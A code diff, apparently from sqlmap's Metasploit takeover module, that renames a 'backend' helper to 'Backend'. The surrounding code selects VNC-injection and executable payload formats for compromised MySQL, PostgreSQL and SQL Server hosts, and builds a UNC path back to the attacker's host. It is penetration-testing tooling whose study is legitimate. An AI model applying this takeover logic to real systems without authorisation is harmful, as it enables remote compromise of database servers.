@@ -19,7 +19,7 @@ from subprocess import PIPE
 from subprocess import Popen as execute
 
 from lib.core.common import dataToStdout
-from lib.core.common import backend
+from lib.core.common import Backend
 from lib.core.common import getLocalIP
 from lib.core.common import getRemoteIP
 from lib.core.common import getUnicode
@@ -187,13 +187,13 @@ class Metasploit:
         if __payloadStr == "windows/vncinject":
             choose = False
 
-            if backend.getIdentifiedDbms() == DBMS.MYSQL:
+            if Backend.getIdentifiedDbms() == DBMS.MYSQL:
                 debugMsg  = "by default MySQL on Windows runs as SYSTEM "
                 debugMsg += "user, it is likely that the the VNC "
                 debugMsg += "injection will be successful"
                 logger.debug(debugMsg)
 
-            elif backend.getIdentifiedDbms() == DBMS.PGSQL:
+            elif Backend.getIdentifiedDbms() == DBMS.PGSQL:
                 choose = True
 
                 warnMsg  = "by default PostgreSQL on Windows runs as "
@@ -201,12 +201,12 @@ class Metasploit:
                 warnMsg += "injection will be successful"
                 logger.warn(warnMsg)
 
-            elif backend.getIdentifiedDbms() == DBMS.MSSQL and backend.isVersionWithin(("2005", "2008")):
+            elif Backend.getIdentifiedDbms() == DBMS.MSSQL and Backend.isVersionWithin(("2005", "2008")):
                 choose = True
 
                 warnMsg  = "it is unlikely that the VNC injection will be "
                 warnMsg += "successful because usually Microsoft SQL Server "
-                warnMsg += "%s runs as Network Service " % backend.getVersion()
+                warnMsg += "%s runs as Network Service " % Backend.getVersion()
                 warnMsg += "or the Administrator is not logged in"
                 logger.warn(warnMsg)
 
@@ -230,12 +230,12 @@ class Metasploit:
                         break
 
                     elif choice == "1":
-                        if backend.getIdentifiedDbms() == DBMS.PGSQL:
+                        if Backend.getIdentifiedDbms() == DBMS.PGSQL:
                             logger.warn("beware that the VNC injection might not work")
 
                             break
 
-                        elif backend.getIdentifiedDbms() == DBMS.MSSQL and backend.isVersionWithin(("2005", "2008")):
+                        elif Backend.getIdentifiedDbms() == DBMS.MSSQL and Backend.isVersionWithin(("2005", "2008")):
                             break
 
                     elif not choice.isdigit():
@@ -555,7 +555,7 @@ class Metasploit:
             # This is useful for sqlmap because on PostgreSQL it is not
             # possible to write files bigger than 8192 bytes abusing the
             # lo_export() feature implemented in sqlmap.
-            if backend.getIdentifiedDbms() == DBMS.PGSQL:
+            if Backend.getIdentifiedDbms() == DBMS.PGSQL:
                 self.__fileFormat = "exe-small"
             else:
                 self.__fileFormat = "exe"
@@ -657,7 +657,7 @@ class Metasploit:
         self.__forgeMsfConsoleResource()
         self.__forgeMsfConsoleCmd()
 
-        if backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
+        if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
             self.uncPath = "\\\\\\\\%s\\\\%s" % (self.lhostStr, self.__randFile)
         else:
             self.uncPath = "\\\\%s\\%s" % (self.lhostStr, self.__randFile)
